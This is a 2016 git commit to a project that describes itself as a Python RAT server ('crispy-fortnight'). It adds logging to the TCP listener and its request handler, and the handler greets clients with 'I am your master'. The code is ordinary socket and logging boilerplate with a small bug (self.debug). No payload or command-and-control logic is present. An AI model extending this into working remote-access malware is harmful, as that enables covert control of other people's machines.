b6c7f70255c6d7f6d39b4e0f13faac4abd26c999
Hans Hoffman <hdot@GreenCouch.local>
2016-03-27 23:35:34 -0400

    adding log functionality to modules

--- crispy/network/server_handler.py
+++ crispy/network/server_handler.py
@@ -1,20 +1,24 @@
+import logging
 import SocketServer
+
+module_logger = logging.getLogger('crispy_srv.CrispyTCPServerHandler')
 
 class CrispyTCPServerHandler(SocketServer.BaseRequestHandler):
     def __init__(self, request, client_address, server):
         SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)
-        return
+	self.logger = logging.getLogger('crispy_srv.CrispyTCPServerHandler')
+	return
     
     def setup(self):
-        print "BaseRequestHandler: setup()"
+        self.debug("BaseRequestHandler: setup()")
         return SocketServer.BaseRequestHandler.setup(self)
     
     def handle(self):
-        print "BaseRequestHandler: connection from {}".format(self.client_address)
+        self.logger.debug("BaseRequestHandler: connection from {}".format(self.client_address))
         # "Session {} opened ({}:{} <- {}:{})".format(self.current_id, server_ip, server_port, client_ip, client_port))
         self.request.sendall("I am your master")
         return
     
     def finish(self):
-        print "BaseRequestHandler: finish()"
+        self.logger.debug("BaseRequestHandler: finish()")
         return SocketServer.BaseRequestHandler.finish(self) 
--- server.py
+++ server.py
@@ -1,24 +1,14 @@
 import argparse
-import ConfigParser
 import logging
+import ConfigParser
 
 from crispy.network.server_handler import CrispyTCPServerHandler
-from crispy.lib.server import CrispyTCPServer  
+from crispy.lib.server import CrispyTCPServer
     
-def run(host, port):       
-    try:
-        server = CrispyTCPServer((host, port), CrispyTCPServerHandler)
-        logging.info("[+] Started server on {0}:{1}".format(server.server_address[0], server.server_address[1]))
-        print 
-        server.serve_forever()
-    except KeyboardInterrupt:
-        server.shutdown()
-        server.socket.close() 
-
 def main():
     argp = argparse.ArgumentParser(description="Run crispy-fortnight (Python RAT) server.",
                                      epilog="Do NOT use this for nefarious purposes!", 
-                                     prog="crispy",)
+                                     prog="crispy")
     argp.add_argument("--config",
                         dest="config_file",
                         help="Path to crispy config file",
@@ -30,14 +20,37 @@ def main():
                         version='1.0')
     args = argp.parse_args()
     
-    config_file = args.config_file
-    logging.info("Reading configuration from {0}".format(config_file))
     config = ConfigParser.ConfigParser()
     config.read(args.config_file)
     
     host = config.get('NETWORK', 'host')
     port = config.getint('NETWORK', 'port')
-    run(host, port)
+
+    logger = logging.getLogger('crispy_srv')
+    logger.setLevel(config.getint('LOGS', 'logLvl'))
     
+    fh = logging.FileHandler('crispy.log')
+    fh.setLevel(config.getint('LOGS', 'logLvl'))
+    
+    console = logging.StreamHandler()
+    console.setLevel(logging.ERROR)
+    
+    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+    fh.setFormatter(formatter)
+    console.setFormatter(formatter)
+        
+    logger.addHandler(fh)
+    logger.addHandler(console)
+    
+    try:
+        server = CrispyTCPServer((host, port), CrispyTCPServerHandler)
+        logger.debug("Started server on {0}:{1}".format(server.server_address[0], server.server_address[1]))
+        server.serve_forever()
+    except KeyboardInterrupt:
+        logger.debug("Shutting down server")
+        logging.shutdown()
+        server.shutdown()
+        server.socket.close()
+ 
 if __name__ == "__main__":
     main()
